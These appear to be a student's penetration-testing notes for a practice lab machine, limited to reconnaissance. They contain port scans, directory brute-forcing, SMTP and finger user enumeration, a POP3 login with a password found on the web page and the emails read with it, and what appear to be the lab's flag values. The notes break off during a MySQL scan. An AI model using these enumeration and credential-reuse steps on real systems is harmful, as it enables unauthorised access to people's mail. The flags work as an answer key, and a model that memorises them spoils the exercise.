**Metadata**

- IP Address:  192.168.148.140
- Hostname: 
- OS:  Microsoft Windows 10 Pro
- Found Credentials/Users:
  Ela Arwel

Main Objectives:

Local.txt = 279455253755968e3f61ee5729cb9c11
Proof.txt = 55cb4c24abff53dee8d3d15d82008570

**Enumeration**

1. NMAP Scans (TCP/UDP)

```
[+] Running: Nmap BASIC TCP (top 1000)
[+] Command: nmap -sS -Pn -n --top-ports 1000 -T4 --open 192.168.148.140 -oN - 
# Nmap 7.95 scan initiated Mon Feb 23 14:17:23 2026 as: nmap -sS -Pn -n --top-ports 1000 -T4 --open -oN - 192.168.148.140
Nmap scan report for 192.168.148.140
Host is up (0.080s latency).
Not shown: 990 closed tcp ports (reset)
PORT     STATE SERVICE
25/tcp   open  smtp
79/tcp   open  finger
106/tcp  open  pop3pw
110/tcp  open  pop3
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
143/tcp  open  imap
443/tcp  open  https
445/tcp  open  microsoft-ds
8000/tcp open  http-alt

[+] Running: Nmap ALL TCP (all ports + versions)
[+] Command: nmap -sS -Pn -n -p- -T4 --open -sV --version-all 192.168.148.140 -oN /home/kali/ProvingGround/Hepet/nmap/full_tcp.nmap -oG /home/kali/ProvingGround/Hepet/nmap/full_tcp.gnmap 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-23 14:17 MST
Nmap scan report for 192.168.148.140
Host is up (0.080s latency).
Not shown: 65419 closed tcp ports (reset), 93 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE        VERSION
25/tcp    open  smtp           Mercury/32 smtpd (Mail server account Maiser)
79/tcp    open  finger         Mercury/32 fingerd
105/tcp   open  ph-addressbook Mercury/32 PH addressbook server
106/tcp   open  pop3pw         Mercury/32 poppass service
110/tcp   open  pop3           Mercury/32 pop3d
135/tcp   open  msrpc          Microsoft Windows RPC
139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
143/tcp   open  imap           Mercury/32 imapd 4.62
443/tcp   open  ssl/http       Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
445/tcp   open  microsoft-ds?
2224/tcp  open  http           Mercury/32 httpd
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
8000/tcp  open  http           Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
11100/tcp open  vnc            VNC (protocol 3.8)
20001/tcp open  ftp            FileZilla ftpd 0.9.41 beta
33006/tcp open  mysql          MariaDB 10.3.24 or later (unauthorized)
49664/tcp open  msrpc          Microsoft Windows RPC
49665/tcp open  msrpc          Microsoft Windows RPC
49666/tcp open  msrpc          Microsoft Windows RPC
49667/tcp open  msrpc          Microsoft Windows RPC
49668/tcp open  msrpc          Microsoft Windows RPC
49669/tcp open  msrpc          Microsoft Windows RPC
Service Info: Host: localhost; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 567.13 seconds



```

2. Interesting Ports/Services

```

```

3. SMTP (Port 25)

```
25/tcp    open  smtp           Mercury/32 smtpd (Mail server account Maiser)
|_smtp-commands: localhost Hello nmap.scanme.org; ESMTPs are:, TIME

PORT   STATE SERVICE
25/tcp open  smtp
|_smtp-commands: localhost Hello nmap.scanme.org; ESMTPs are:, TIME
| smtp-enum-users: 
|   root
|   Method VRFY returned a unhandled status code.
|_  Method EXPN returned a unhandled status code.
|_smtp-open-relay: Server is an open relay (2/16 tests)
| smtp-vuln-cve2010-4344: 
|_  The SMTP server is not Exim: NOT VULNERABLE

Nmap done: 1 IP address (1 host up) scanned in 1.21 seconds

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... VRFY
Worker Processes ......... 5
Usernames file ........... users
Target count ............. 1
Username count ........... 14
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ 

######## Scan started at Tue Feb 24 14:59:02 2026 #########
192.168.148.140: admin exists
######## Scan completed at Tue Feb 24 14:59:03 2026 #########
1 results.

14 queries in 1 seconds (14.0 queries / sec)



```

3. Finger (Port 79)

```
79/tcp    open  finger         Mercury/32 fingerd
| finger: Login: Admin         Name: Mail System Administrator\x0D
| \x0D
|_[No profile information]\x0D


└─$ finger @192.168.148.140
Login: Admin         Name: Mail System Administrator

[No profile information]

finger-user-enum.pl -U users -t 192.168.148.140 |grep Login
charlotte@192.168.148.140: Login: charlotte         Name: Charlotte....[No profile information]..
magnus@192.168.148.140: Login: magnus         Name: Magnus..
agnes@192.168.148.140: Login: agnes         Name: Agnes..
jonas@192.168.148.140: Login: jonas         Name: Jonas..
martha@192.168.148.140: Login: martha         Name: Martha....[No profile information]..
admin@192.168.148.140: Login: admin         Name: Mail System Administrator..


```

4. PH-Addressbook (Port 105)

```
telnet 192.168.148.140 105                         
Trying 192.168.148.140...
Connected to 192.168.148.140.
Escape character is '^]'.

598::Command not recognized.
help
-200:1: Mercury Simple PH Server v4.62
-200:1: Copyright 1999-2008, David Harris, all rights reserved.
-200:1: 
-200:1: This PH server supports the following commands
-200:1: FIELDS  HELP  QUERY  QUIT  SITEINFO  STATUS
-200:1: 
-200:1: "[fieldname]=" queries are supported
-200:1: "return" clauses are supported in queries
-200:1: wildcard searches are not supported
200:OK.
SITEINFO
-200:1:version:0.9
-200:4:mailbox:email
200:Ready
FIELDS
-200:1:name:max 40 public lookup unique indexed default
-200:1:name:Familiar name
-200:2:department:max 40 public lookup default
-200:2:department:User's department or company
-200:3:address:max 60 public lookup default
-200:3:address:Street or delivery address
-200:4:postal:max 60 public lookup default
-200:4:postal:Postal address
-200:5:phone:max 24 public lookup default
-200:5:phone:Contact telephone number
-200:6:fax:max 24 public lookup default
-200:6:fax:Contact facsimile number
-200:7:email:max 100 public lookup default
-200:7:email:Electronic mail address
-200:8:other:max 80 public lookup default
-200:8:other:Other related information
200:OK
STATUS    
100:Mercury Simple PH Server v0.9
200:Ready
Connection closed by foreign host.

```

5. POP3pw (Port 106)

```
106/tcp   open  pop3pw         Mercury/32 poppass service

telnet 192.168.148.140 106  
Trying 192.168.148.140...
Connected to 192.168.148.140.
Escape character is '^]'.
200 localhost MercuryW PopPass server ready.
USER admin
300 Send current password using PASS command:
PASS password
554 Incorrect username or password.
LIST
501 Bad command or syntax error.
QUIT
200 Au revoir.
Connection closed by foreign host.

```

5. POP3 (Port 110)

```
110/tcp   open  pop3           Mercury/32 pop3d
|_pop3-capabilities: EXPIRE(NEVER) APOP TOP USER UIDL

telnet 192.168.148.140 110
Trying 192.168.148.140...
Connected to 192.168.148.140.
Escape character is '^]'.
+OK <2934750.31513@localhost>, POP3 server ready.
USER admin
+OK admin is known here.
LIST    
-ERR Please login with USER and PASS first.
PASS password
-ERR Username or password is invalid or incorrect.

 telnet 192.168.148.140 110
Trying 192.168.148.140...
Connected to 192.168.148.140.
Escape character is '^]'.
+OK <2008406.28485@localhost>, POP3 server ready.
USER jonas
+OK jonas is known here.
LIST    
-ERR Please login with USER and PASS first.
PASS
-ERR Username or password is invalid or incorrect.
PASS SicMundusCreatusEst

-ERR Please tell me who you are first.
-ERR Unrecognized command (try HELP).
USER jonas
+OK jonas is known here.
PASS SicMundusCreatusEst

+OK Welcome! 4 messages (4744 bytes)
-ERR Unrecognized command (try HELP).
LIST    
+OK 4 messages, 4744 bytes
1 1342
2 963
3 1347
4 1092
.
1
-ERR Unrecognized command (try HELP).
RETR 1
+OK Here it comes...
Received: from spooler by localhost (Mercury/32 v4.62); 19 Oct 2020 12:29:03 -0700
X-Envelope-To: <jonas@localhost>
Return-path: <agnes@localhost>
Received: from kali (192.168.118.8) by localhost (Mercury/32 v4.62) with ESMTP ID MG00000A;
   19 Oct 2020 12:28:54 -0700
Message-ID: <135985.54474035-sendEmail@kali>
From: "agnes@localhost" <agnes@localhost>
To: "mailadmin@localhost" <mailadmin@localhost>
Cc: "jonas@localhost" <jonas@localhost>,
 "magnus@localhost" <magnus@localhost>
Subject: Contacts Information
Date: Mon, 19 Oct 2020 19:28:53 +0000
X-Mailer: sendEmail-1.56
MIME-Version: 1.0
Content-Type: multipart/related; boundary="----MIME delimiter for sendEmail-678721.390272589"

This is a multi-part message in MIME format. To properly display this message you need a MIME-Version 1.0 compliant Email program.

------MIME delimiter for sendEmail-678721.390272589
Content-Type: text/plain;
        charset="iso-8859-1"
Content-Transfer-Encoding: 7bit

Hi team!

I'm new here, will be doing PR for the company. 
Its a pleasure to work with all of you!

If you can please send to mailadmin the spreadsheet for printing with all the company contacts will be really apreciated .

Ela, can you install the office suite on my machine?

Cheers!


------MIME delimiter for sendEmail-678721.390272589--

.
Connection closed by foreign host.
                                                                                                                                                                                                                   
┌──(kali㉿Kali)-[~/ProvingGround/Hepet]
└─$ telnet 192.168.148.140 110
Trying 192.168.148.140...
Connected to 192.168.148.140.
Escape character is '^]'.
+OK <2200218.27438@localhost>, POP3 server ready.
user jonas
+OK jonas is known here.
pass SicMundusCreatusEst

+OK Welcome! 4 messages (4744 bytes)
-ERR Unrecognized command (try HELP).
list
+OK 4 messages, 4744 bytes
1 1342
2 963
3 1347
4 1092
.
retr 1
+OK Here it comes...
Received: from spooler by localhost (Mercury/32 v4.62); 19 Oct 2020 12:29:03 -0700
X-Envelope-To: <jonas@localhost>
Return-path: <agnes@localhost>
Received: from kali (192.168.118.8) by localhost (Mercury/32 v4.62) with ESMTP ID MG00000A;
   19 Oct 2020 12:28:54 -0700
Message-ID: <135985.54474035-sendEmail@kali>
From: "agnes@localhost" <agnes@localhost>
To: "mailadmin@localhost" <mailadmin@localhost>
Cc: "jonas@localhost" <jonas@localhost>,
 "magnus@localhost" <magnus@localhost>
Subject: Contacts Information
Date: Mon, 19 Oct 2020 19:28:53 +0000
X-Mailer: sendEmail-1.56
MIME-Version: 1.0
Content-Type: multipart/related; boundary="----MIME delimiter for sendEmail-678721.390272589"

This is a multi-part message in MIME format. To properly display this message you need a MIME-Version 1.0 compliant Email program.

------MIME delimiter for sendEmail-678721.390272589
Content-Type: text/plain;
        charset="iso-8859-1"
Content-Transfer-Encoding: 7bit

Hi team!

I'm new here, will be doing PR for the company. 
Its a pleasure to work with all of you!

If you can please send to mailadmin the spreadsheet for printing with all the company contacts will be really apreciated .

Ela, can you install the office suite on my machine?

Cheers!


------MIME delimiter for sendEmail-678721.390272589--

.
retr 2
+OK Here it comes...
Received: from spooler by localhost (Mercury/32 v4.62); 19 Oct 2020 12:28:52 -0700
X-Envelope-To: <jonas@localhost>
Return-path: <martha@localhost>
Received: from kali (192.168.118.8) by localhost (Mercury/32 v4.62) with ESMTP ID MG000006;
   19 Oct 2020 12:28:48 -0700
Message-ID: <898523.650921078-sendEmail@kali>
From: "martha@localhost" <martha@localhost>
To: "jonas@localhost" <jonas@localhost>
Subject: Love
Date: Mon, 19 Oct 2020 19:28:47 +0000
X-Mailer: sendEmail-1.56
MIME-Version: 1.0
Content-Type: multipart/related; boundary="----MIME delimiter for sendEmail-159605.589303286"

This is a multi-part message in MIME format. To properly display this message you need a MIME-Version 1.0 compliant Email program.

------MIME delimiter for sendEmail-159605.589303286
Content-Type: text/plain;
        charset="iso-8859-1"
Content-Transfer-Encoding: 7bit

Forever and ever?


------MIME delimiter for sendEmail-159605.589303286--

.
retr 3
+OK Here it comes...
Received: from spooler by localhost (Mercury/32 v4.62); 19 Oct 2020 12:28:41 -0700
X-Envelope-To: <jonas@localhost>
Return-path: <mailadmin@localhost>
Received: from kali (192.168.118.8) by localhost (Mercury/32 v4.62) with ESMTP ID MG000001;
   19 Oct 2020 12:28:40 -0700
Message-ID: <359094.447081105-sendEmail@kali>
From: "mailadmin@localhost" <mailadmin@localhost>
To: "agnes@localhost" <agnes@localhost>
Cc: "jonas@localhost" <jonas@localhost>,
 "magnus@localhost" <magnus@localhost>
Subject: Important
Date: Mon, 19 Oct 2020 19:28:39 +0000
X-Mailer: sendEmail-1.56
MIME-Version: 1.0
Content-Type: multipart/related; boundary="----MIME delimiter for sendEmail-808784.915440814"

This is a multi-part message in MIME format. To properly display this message you need a MIME-Version 1.0 compliant Email program.

------MIME delimiter for sendEmail-808784.915440814
Content-Type: text/plain;
        charset="iso-8859-1"
Content-Transfer-Encoding: 7bit

Team,

We will be changing our office suite to LibreOffice. For the moment, all the spreadsheets and documents will be first procesed in the mail server directly to check the compatibility. 

I will forward all the documents after checking everything is working okay. 

Sorry for the inconveniences.


------MIME delimiter for sendEmail-808784.915440814--

.
retr 4
+OK Here it comes...
Received: from spooler by localhost (Mercury/32 v4.62); 19 Oct 2020 12:28:52 -0700
X-Envelope-To: <jonas@localhost>
Return-path: <mailadmin@localhost>
Received: from kali (192.168.118.8) by localhost (Mercury/32 v4.62) with ESMTP ID MG000008;
   19 Oct 2020 12:28:51 -0700
Message-ID: <841577.174232469-sendEmail@kali>
From: "mailadmin@localhost" <mailadmin@localhost>
To: "jonas@localhost" <jonas@localhost>
Subject: Weak Password
Date: Mon, 19 Oct 2020 19:28:50 +0000
X-Mailer: sendEmail-1.56
MIME-Version: 1.0
Content-Type: multipart/related; boundary="----MIME delimiter for sendEmail-502425.856729136"

This is a multi-part message in MIME format. To properly display this message you need a MIME-Version 1.0 compliant Email program.

------MIME delimiter for sendEmail-502425.856729136
Content-Type: text/plain;
        charset="iso-8859-1"
Content-Transfer-Encoding: 7bit

Hey Jonas,

Please change your password, you cannot use the same password as your one liner description, just dont.

Thanks!


------MIME delimiter for sendEmail-502425.856729136--

.


```

6. MSRPC (Port 135)

```
rpcinfo -p 192.168.148.140
192.168.148.140: RPC: Remote system error - Connection refused

rpcclient -U '' -N 192.168.148.140     
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED

```

4. IMAP (Port 143)

```
143/tcp   open  imap           Mercury/32 imapd 4.62
|_imap-capabilities: X-MERCURY-1A0001 OK IMAP4rev1 CAPABILITY complete AUTH=PLAIN

```

7. Web Enumeration (Port 443)

```
443/tcp   open  ssl/http       Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
|_http-title: Time Travel Company Page
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| http-methods: 
|_  Potentially risky methods: TRACE

[+] Running: Gobuster BASIC (443)
[+] Command: gobuster dir -u https://192.168.148.140:443 -w /usr/share/wordlists/dirb/common.txt -t 50 -k -o /home/kali/ProvingGround/Hepet/gobuster/Hepet_192.168.148.140_443_dir_basic.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://192.168.148.140:443
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================

/fonts                (Status: 301) [Size: 345] [--> https://192.168.148.140/fonts/]
/index.html           (Status: 200) [Size: 13032]
/examples             (Status: 503) [Size: 406]
/team                 (Status: 301) [Size: 344] [--> https://192.168.148.140/team/]
Progress: 4497 / 4613 (97.49%)
===============================================================
Progress: 4613 / 4613 (100.00%)Finished

[+] Running: Gobuster ADVANCED (443)
[+] Command: gobuster dir -u https://192.168.148.140:443 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -k -o /home/kali/ProvingGround/Hepet/gobuster/Hepet_192.168.148.140_443_dir_advanced.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://192.168.148.140:443
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/# license, visit http://creativecommons.org/licenses/by-sa/3.0/ (Status: 403) [Size: 306]
/team                 (Status: 301) [Size: 344] [--> https://192.168.148.140/team/]
/examples             (Status: 503) [Size: 406]
/fonts                (Status: 301) [Size: 345] [--> https://192.168.148.140/fonts/]
/Fonts                (Status: 301) [Size: 345] [--> https://192.168.148.140/Fonts/]
/Team                 (Status: 301) [Size: 344] [--> https://192.168.148.140/Team/]
Progress: 220350 / 220558 (99.91%)
Progress: 220558 / 220558 (100.00%)===============================================================
Finished

[+] Running: Gobuster FILE search (443)
[+] Command: gobuster dir -u https://192.168.148.140:443 -w /usr/share/wordlists/dirb/common.txt -x php\,asp\,aspx\,jsp\,html\,txt\,bak\,old\,zip\,tar\,tar.gz -t 50 -k -o /home/kali/ProvingGround/Hepet/gobuster/Hepet_192.168.148.140_443_files.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://192.168.148.140:443
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              aspx,jsp,html,bak,old,zip,php,asp,txt,tar,tar.gz
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================

/examples             (Status: 503) [Size: 406]
/fonts                (Status: 301) [Size: 345] [--> https://192.168.148.140/fonts/]
/Index.html           (Status: 200) [Size: 13032]
/index.html           (Status: 200) [Size: 13032]
/index.html           (Status: 200) [Size: 13032]

/team                 (Status: 301) [Size: 344] [--> https://192.168.148.140/team/]
Progress: 55356 / 55356 (100.00%)
===============================================================
Finished

[+] Running: Gobuster FILE search (8000)
[+] Command: gobuster dir -u http://192.168.148.140:8000 -w /usr/share/wordlists/dirb/common.txt -x php\,asp\,aspx\,jsp\,html\,txt\,bak\,old\,zip\,tar\,tar.gz -t 50 -o /home/kali/ProvingGround/Hepet/gobuster/Hepet_192.168.148.140_8000_files.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.148.140:8000
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,asp,jsp,html,txt,old,tar.gz,aspx,bak,zip,tar
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================

/examples             (Status: 503) [Size: 407]
/fonts                (Status: 301) [Size: 350] [--> http://192.168.148.140:8000/fonts/]
/index.html           (Status: 200) [Size: 13032]
/Index.html           (Status: 200) [Size: 13032]
/index.html           (Status: 200) [Size: 13032]

/team                 (Status: 301) [Size: 349] [--> http://192.168.148.140:8000/team/]
/webalizer            (Status: 403) [Size: 307]
Progress: 55303 / 55356 (99.90%)
Progress: 55356 / 55356 (100.00%)===============================================================
Finished

[+] Running: Nikto (443)
[+] Command: nikto -h https://192.168.148.140:443 -output /home/kali/ProvingGround/Hepet/web/192.168.148.140_443/nikto.txt -Format txt 
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.148.140
+ Target Hostname:    192.168.148.140
+ Target Port:        443
---------------------------------------------------------------------------
+ SSL Info:        Subject:  /CN=localhost
                   Ciphers:  TLS_AES_256_GCM_SHA384
                   Issuer:   /CN=localhost
+ Start Time:         2026-02-23 15:22:37 (GMT-7)
---------------------------------------------------------------------------
+ Server: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The site uses TLS and the Strict-Transport-Security HTTP header is not defined. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ Apache/2.4.46 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ OpenSSL/1.1.1g appears to be outdated (current is at least 3.0.7). OpenSSL 1.1.1s is current for the 1.x branch and will be supported until Nov 11 2023.
+ PHP/7.3.23 appears to be outdated (current is at least 8.1.5), PHP 7.4.28 for the 7.4 branch.
+ Hostname '192.168.148.140' does not match certificate's names: localhost. See: https://cwe.mitre.org/data/definitions/297.html
+ OPTIONS: Allowed HTTP Methods: POST, OPTIONS, HEAD, GET, TRACE .
+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
+ /icons/: Directory indexing found.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ 8909 requests: 0 error(s) and 11 item(s) reported on remote host
+ End Time:           2026-02-23 16:18:22 (GMT-7) (3345 seconds)
---------------------------------------------------------------------------

```

8. SMB Port 139, 445 Enumeration

```
smbclient -L //192.168.148.140 -U anonymous
Password for [WORKGROUP\anonymous]:
session setup failed: NT_STATUS_LOGON_FAILURE

 smbmap -H 192.168.148.40                   


    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 0 hosts serving SMB                                                                                                  
[*] Closed 0 connections                  


```

9. Mercury/32 httpd (Port 2224)

```
2224/tcp  open  http           Mercury/32 httpd
|_http-title: Mercury HTTP Services

```

9. Port 5040

```
5040/tcp  open  unknown

```

10. Port 2224 

```
Site Vist:

- Is a Mailing List Subscriber Website


[+] Running: Nikto (2224)
[+] Command: nikto -h http://192.168.148.140:2224 -output /home/kali/ProvingGround/Hepet/web/192.168.148.140_2224/nikto.txt -Format txt 
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.148.140
+ Target Hostname:    192.168.148.140
+ Target Port:        2224
+ Start Time:         2026-02-23 16:18:23 (GMT-7)
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ ERROR: Error limit (20) reached for host, giving up. Last error: error reading HTTP response
+ Scan terminated: 20 error(s) and 2 item(s) reported on remote host
+ End Time:           2026-02-23 16:18:31 (GMT-7) (8 seconds)

```
10. Pando-Pub (Port 7680)

```
7680/tcp  open  pando-pub?

```

11. Web Enumeration (Port 8000)

```
8000/tcp  open  http           Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
|_http-title: Time Travel Company Page
| http-methods: 
|_  Potentially risky methods: TRACE

Webserver Info - 
Running Applications - 
Site Visit - Time Travel Company. Found list of company employees the below looked like a password. 

**Jonas K.**

SicMundusCreatusEst


[+] Running: Gobuster BASIC (8000)
[+] Command: gobuster dir -u http://192.168.148.140:8000 -w /usr/share/wordlists/dirb/common.txt -t 50 -o /home/kali/ProvingGround/Hepet/gobuster/Hepet_192.168.148.140_8000_dir_basic.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.148.140:8000
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================

/fonts                (Status: 301) [Size: 350] [--> http://192.168.148.140:8000/fonts/]
/index.html           (Status: 200) [Size: 13032]
/examples             (Status: 503) [Size: 407]
/team                 (Status: 301) [Size: 349] [--> http://192.168.148.140:8000/team/]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished

[+] Running: Gobuster ADVANCED (8000)
[+] Command: gobuster dir -u http://192.168.148.140:8000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -o /home/kali/ProvingGround/Hepet/gobuster/Hepet_192.168.148.140_8000_dir_advanced.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.148.140:8000
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/# license, visit http://creativecommons.org/licenses/by-sa/3.0/ (Status: 403) [Size: 307]
/team                 (Status: 301) [Size: 349] [--> http://192.168.148.140:8000/team/]
/examples             (Status: 503) [Size: 407]
/fonts                (Status: 301) [Size: 350] [--> http://192.168.148.140:8000/fonts/]
/Fonts                (Status: 301) [Size: 350] [--> http://192.168.148.140:8000/Fonts/]
/Team                 (Status: 301) [Size: 349] [--> http://192.168.148.140:8000/Team/]

Progress: 220423 / 220558 (99.94%)
Progress: 220558 / 220558 (100.00%)===============================================================
Finished

[+] Running: Nikto (8000)
[+] Command: nikto -h http://192.168.148.140:8000 -output /home/kali/ProvingGround/Hepet/web/192.168.148.140_8000/nikto.txt -Format txt 
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.148.140
+ Target Hostname:    192.168.148.140
+ Target Port:        8000
+ Start Time:         2026-02-23 16:18:32 (GMT-7)
---------------------------------------------------------------------------
+ Server: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ OpenSSL/1.1.1g appears to be outdated (current is at least 3.0.7). OpenSSL 1.1.1s is current for the 1.x branch and will be supported until Nov 11 2023.
+ PHP/7.3.23 appears to be outdated (current is at least 8.1.5), PHP 7.4.28 for the 7.4 branch.
+ Apache/2.4.46 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ OPTIONS: Allowed HTTP Methods: POST, OPTIONS, HEAD, GET, TRACE .
+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
+ /icons/: Directory indexing found.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ 8908 requests: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2026-02-23 16:31:42 (GMT-7) (790 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

[+] Done.


```

13. VNC Protocol 3.8 (Port 11100)

```
11100/tcp open  vnc            VNC (protocol 3.8)
| vnc-info: 
|   Protocol version: 3.8
|   Security types: 
|_    Unknown security type (40)

```

14. FileZilla ftpd 0.9.41 beta (Port 20001)

```
20001/tcp open  ftp            FileZilla ftpd 0.9.41 beta
|_ftp-bounce: bounce working!
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -r--r--r-- 1 ftp ftp            312 Oct 20  2020 .babelrc
| -r--r--r-- 1 ftp ftp            147 Oct 20  2020 .editorconfig
| -r--r--r-- 1 ftp ftp             23 Oct 20  2020 .eslintignore
| -r--r--r-- 1 ftp ftp            779 Oct 20  2020 .eslintrc.js
| -r--r--r-- 1 ftp ftp            167 Oct 20  2020 .gitignore
| -r--r--r-- 1 ftp ftp            228 Oct 20  2020 .postcssrc.js
| -r--r--r-- 1 ftp ftp            346 Oct 20  2020 .tern-project
| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 build
| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 config
| -r--r--r-- 1 ftp ftp           1376 Oct 20  2020 index.html
| -r--r--r-- 1 ftp ftp         425010 Oct 20  2020 package-lock.json
| -r--r--r-- 1 ftp ftp           2454 Oct 20  2020 package.json
| -r--r--r-- 1 ftp ftp           1100 Oct 20  2020 README.md
| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 src
| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 static
|_-r--r--r-- 1 ftp ftp            127 Oct 20  2020 _redirects
```

14. MSQL (Port 33006)

```
33006/tcp open  mysql          MariaDB 10.3.24 or later (unauthorized)

sudo nmap -sV -p 33006 --script=mysql-* 192.168.148.140
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-24 15:33 MST
Nmap scan report for 192.168.148.140
Host is up (0.072s latency).

PORT      STATE SERVICE VERSION
